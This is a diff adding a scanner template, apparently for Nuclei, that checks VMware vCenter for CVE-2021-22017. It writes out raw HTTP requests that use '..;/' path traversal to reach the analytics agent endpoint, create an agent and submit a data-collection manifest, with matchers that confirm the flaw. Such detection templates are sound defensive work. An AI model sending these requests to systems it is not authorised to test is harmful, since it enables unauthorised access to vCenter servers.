@@ -1,0 +1,71 @@
+id: cve-2021-22017
+
+info:
+  name: VMware vCenter RCE (CVE-2021-22017)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,vmware,vcenter
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2021-0020.html
+    - https://kb.vmware.com/s/article/85717
+
+variables:
+  agent_name: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /analytics/telemetry/ph/api/hyper/send?_c&_i=test HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 4
+
+        test
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+
+  - raw:
+      - |
+        POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c={{agent_name}}&_i=test2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        X-Deployment-Secret: abc
+        Content-Length: 158
+
+        {"manifestSpec":{},"objectType":"a2","collectionTriggerDataNeeded":true,"deploymentDataNeeded":true,"resultNeeded":true,"signalCollectionCompleted":true,"localManifestPath":"a7","localPayloadPath":"a8","localObfuscationMapPath":"a9"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "manifestSpec"
+
+  - raw:
+      - |
+        POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c={{agent_name}}&_i=test2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        X-Deployment-Secret: abc
+        Content-Length: 288
+
+        {"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n   <request>\n      <query name=\"vir:VCenter\">\n         <constraint>\n            <targetType>ServiceInstance</targetType>\n         </constraint>\n         <propertySpec>\n            <propertyNames>content.about.instanceUuid</propertyNames>\n            <propertyNames>content.about.osType</propertyNames>\n            <propertyNames>content.about.build</propertyNames>\n            <propertyNames>content.about.version</propertyNames>\n         </propertySpec>\n      </query>\n   </request>\n   <cdfMapping>\n      <indepedentResultsMapping>\n         <resultSetMappings>\n            <entry>\n               <key>vir:VCenter</key>\n               <value>\n                  <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                     <resourceItemToJsonLdMapping>\n                        <forType>ServiceInstance</forType>\n                     </resourceItemToJsonLdMapping>\n                  </value>\n               </value>\n            </entry>\n         </resultSetMappings>\n      </indepedentResultsMapping>\n   </cdfMapping>\n</manifest>", "objectId": "a2"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "vir:VCenter"
+          - "ServiceInstance"
